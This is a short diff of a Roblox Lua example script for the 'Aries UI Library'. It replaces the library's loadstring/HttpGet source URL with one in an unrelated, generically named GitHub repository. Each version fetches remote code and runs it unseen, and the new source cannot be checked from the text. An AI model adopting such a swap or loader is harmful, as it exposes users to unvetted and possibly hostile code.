@@ -1,6 +1,6 @@
 -- // Aries UI Library - Example Script
 -- // Load the library
-local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/refs/heads/main/UI-Libraries/Aries%20UI%20Library/AriesSource.lua'))()
+local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/X5Dermaster/testere/refs/heads/main/lib'))()
 
 -- // Create Window
 local Window = Library:CreateWindow({
